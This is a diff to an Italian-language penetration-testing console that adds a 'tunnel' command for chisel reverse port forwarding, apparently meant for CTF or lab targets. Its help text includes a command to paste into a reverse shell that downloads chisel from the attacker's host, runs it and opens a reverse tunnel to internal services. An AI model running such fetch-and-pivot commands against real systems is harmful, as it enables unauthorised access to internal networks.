@@ -17,6 +17,7 @@ from pathlib import Path
 from shutil import get_terminal_size, which
 
 from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url, list_loot as _serve_list_loot, read_loot as _serve_read_loot, clear_loot as _serve_clear_loot, LOOT_ROOT
+from http_server import tunnel_fetch as _tunnel_fetch, tunnel_start as _tunnel_start, tunnel_stop as _tunnel_stop, tunnel_status as _tunnel_status, tunnel_list as _tunnel_list
 
 try:
     import readline  # type: ignore
@@ -325,6 +326,7 @@ def print_help_text() -> None:
     print()
     print("  \033[92;1m  Serve Operations\033[0m")
     print("  loot [azione]      Gestisci file ricevuti dalla vulnbox (loot help)")
+    print("  tunnel <azione>    Port forwarding via chisel (tunnel help)")
     print()
     print("  \033[92;1m— Wordlists\033[0m")
     print("  wordfind [url]     Wizard wordlist per fuzzing/bruteforce")
@@ -480,6 +482,12 @@ def build_parser() -> argparse.ArgumentParser:
     wordfind_p.add_argument("url", nargs="?", default=None)
     subparsers.add_parser("passfind", add_help=False)
     subparsers.add_parser("wordgen", add_help=False)
+    tunnel_p = subparsers.add_parser("tunnel", add_help=False)
+    tunnel_p.add_argument("action", nargs="?", default="status")
+    tunnel_p.add_argument("port", nargs="?", type=int, default=None)
+    tunnel_p.add_argument("--local-port", type=int, default=9000)
+    tunnel_p.add_argument("--server-port", type=int, default=8443)
+    tunnel_p.add_argument("--force", action="store_true", default=False)
     return parser
 
 
@@ -495,7 +503,7 @@ def setup_readline() -> None:
 
 
 _COMPLETABLE = sorted(["sealsay", "list", "install", "use", "search", "vuln",
-                        "notes", "find", "back", "help", "serve", "loot", "wordfind", "passfind", "wordgen", "exit"])
+                        "notes", "find", "back", "help", "serve", "loot", "wordfind", "passfind", "wordgen", "tunnel", "exit"])
 _input_history: list[str] = []
 
 
@@ -720,6 +728,7 @@ def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
         "wordfind": cmd_wordfind,
         "passfind": cmd_passfind,
         "wordgen": cmd_wordgen,
+        "tunnel": cmd_tunnel,
     }
     handler = handlers.get(args.command)
     if handler is None:
@@ -836,7 +845,7 @@ def run_console() -> int:
                     state.last_vuln_tools = _extract_vuln_tools(text)
                 continue
 
-        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve", "loot", "wordfind", "passfind", "wordgen"}
+        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve", "loot", "wordfind", "passfind", "wordgen", "tunnel"}
         if argv[0] not in known_commands:
             print("Comando non riconosciuto. Digita 'help' per i comandi.")
             continue
@@ -1637,6 +1646,126 @@ def cmd_loot(args: argparse.Namespace, state: ConsoleState | None = None) -> int
     print(f"Azione sconosciuta: {action}")
     print("Azioni disponibili: list, read <nome|num>, clear, help")
     return 1
+
+
+# ---------------------------------------------------------------------------
+# tunnel — Port forwarding con chisel
+# ---------------------------------------------------------------------------
+
+def _tunnel_help() -> None:
+    render_markdown(r"""# tunnel — Port Forwarding via chisel
+
+Crea un tunnel reverse per accedere a servizi interni del target
+(webapp su localhost, admin panel, ecc.) direttamente nel tuo browser.
+
+## Comandi
+
+| Comando | Descrizione |
+|---------|-------------|
+| `tunnel on <porta>` | Avvia tunnel per la porta remota specificata |
+| `tunnel off` | Chiudi chisel server e tutti i tunnel |
+| `tunnel status` | Mostra stato del server e tunnel attivi |
+| `tunnel list` | Elenca i tunnel attivi |
+| `tunnel fetch [--force]` | Scarica chisel in `static/` |
+| `tunnel help` | Mostra questo aiuto |
+
+## Opzioni
+
+| Opzione | Default | Descrizione |
+|---------|---------|-------------|
+| `--local-port` | 9000 | Porta locale su cui mappare il tunnel |
+| `--server-port` | 8443 | Porta del chisel server |
+
+## Esempio tipico
+
+```bash
+# 1. In SLConsole — avvia tunnel per la porta 80 del target
+slconsole> tunnel on 80
+
+# 2. Copia il comando mostrato e incollalo nella revshell
+curl http://LHOST:2727/static/chisel -o /tmp/chisel && \
+  chmod +x /tmp/chisel && \
+  /tmp/chisel client LHOST:8443 R:9000:127.0.0.1:80 &
+
+# 3. Apri nel browser
+http://localhost:9000
+
+# 4. Tunnel multipli — ogni volta con porta locale diversa
+slconsole> tunnel on 8080 --local-port 9001
+```
+
+## Requisiti
+
+- **chisel** deve essere in `static/` — usa `tunnel fetch` per scaricarlo
+- Il target deve poter raggiungere LHOST sulla porta del chisel server (8443)
+""")
+
+
+def cmd_tunnel(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
+    action = normalize(getattr(args, "action", "status"))
+
+    if action in {"help", "h", "-h", "--help"}:
+        _tunnel_help()
+        return 0
+
+    if action in {"on", "start"}:
+        port = getattr(args, "port", None)
+        if port is None:
+            try:
+                raw = input("\n  Porta remota da forwardare: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return 0
+            if not raw.isdigit():
+                print("Specifica una porta numerica.", file=sys.stderr)
+                return 1
+            port = int(raw)
+        local_port = getattr(args, "local_port", 9000)
+        server_port = getattr(args, "server_port", 8443)
+        lhost = getattr(args, "lhost", None)
+        if lhost is None:
+            ifaces = _serve_discover_interfaces()
+            if not ifaces:
+                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
+                return 1
+            if len(ifaces) == 1:
+                lhost = ifaces[0][1]
+            else:
+                print("\n  Interfacce disponibili:\n")
+                for i, (name, addr) in enumerate(ifaces, 1):
+                    print(f"    [{i}] {name:<12s}  {addr}")
+                print()
+                while True:
+                    try:
+                        choice = input("  Scegli interfaccia [1]: ").strip()
+                    except (EOFError, KeyboardInterrupt):
+                        print()
+                        return 0
+                    if not choice:
+                        choice = "1"
+                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+                        lhost = ifaces[int(choice) - 1][1]
+                        break
+                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")
+        print(_tunnel_start(remote_port=port, local_port=local_port,
+                            server_port=server_port, lhost=lhost))
+        return 0
+
+    if action in {"off", "stop"}:
+        print(_tunnel_stop())
+        return 0
+
+    if action == "fetch":
+        force = getattr(args, "force", False)
+        print(_tunnel_fetch(force=force))
+        return 0
+
+    if action in {"list", "ls"}:
+        print(_tunnel_list())
+        return 0
+
+    print(_tunnel_status())
+    return 0
 
 
 # ---------------------------------------------------------------------------
